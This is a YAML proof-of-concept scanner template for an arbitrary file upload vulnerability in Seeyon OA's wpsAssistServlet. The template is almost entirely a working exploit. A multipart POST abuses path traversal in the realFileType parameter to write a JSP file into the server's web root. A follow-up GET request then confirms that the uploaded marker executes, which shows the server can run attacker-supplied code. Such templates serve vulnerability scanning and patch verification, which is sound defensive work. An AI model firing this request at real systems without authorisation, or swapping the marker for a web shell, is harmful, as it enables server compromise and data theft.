id: poc-yaml-Seeyon-OA-wpsAssistServlet-file-upload
info:
  name: 致远OA Seeyon OA wpsAssistServlet 任意文件上传漏洞
  severity: high
  tags:
  - 两高一弱
  - 文件上传
  finger: 致远互联-OA
variables:
  t1: random_str(8)
  t2: md5(t1)
requests:
- raw: 'POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{.t1}}.jsp&fileId=2
    HTTP/1.1

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylAoqLthw9exSsFFB


    ------WebKitFormBoundarylAoqLthw9exSsFFB

    Content-Disposition: form-data; name="upload"; filename="123.xls"

    Content-Type: application/vnd.ms-excel


    <% out.println("{{.t2}}");%>

    ------WebKitFormBoundarylAoqLthw9exSsFFB--'
  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"\"code\":200")
- method: GET
  path: /{{.t1}}.jsp
  expression: status_code == 200 && contains(body,t2)
transport: http
